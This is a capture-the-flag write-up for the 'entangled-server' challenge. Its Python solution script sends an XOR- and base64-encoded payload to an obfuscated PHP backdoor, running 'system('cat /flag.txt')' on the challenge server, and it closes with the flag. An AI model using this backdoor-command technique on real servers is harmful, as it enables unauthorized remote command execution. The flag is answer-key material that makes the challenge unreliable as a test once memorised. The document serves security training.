# entangled-server

Solved by: @vicevirus

## Question:
A NICC agent found an old abandoned server with some very suspicious files on it. We have found the file it was hosting on a webserver but it seems like it was very heavily obfuscated. Can you figure out how to get in?

The flag is located at /flag.txt on the server.

## Solution:
```
import requests
import base64
import json

# Step 1: Define the URL and POST parameters
target_url = "http://entangled-server.niccgetsspooky.xyz:1337/index.php"
param_name = "x"
cc688 = "5p1n-th3-51lly-5tr1ng5"

# Step 2: Create the payload dictionary
payload_dict = {
    "ak": cc688,
    "a": "e",
    "d": "system('cat /flag.txt');"
}

# Step 3: Serialize the payload (convert to JSON)
serialized_data = json.dumps(payload_dict).encode('utf-8')

# Step 4: Define XOR keys
key1 = cc688.encode('utf-8')
key2 = param_name.encode('utf-8')

# Step 5: Apply XOR
xor_encoded = bytes([b ^ key1[i % len(key1)] ^ key2[i % len(key2)] for i, b in enumerate(serialized_data)])

encoded_payload = base64.b64encode(xor_encoded).decode('utf-8')

data = {param_name: encoded_payload}
response = requests.post(target_url, data=data)

print(response.text)
NICC{TH3_5P1D3R5_G0T_1N_00P5}
```

**Flag:** `NICC{TH3_5P1D3R5_G0T_1N_00P5}`
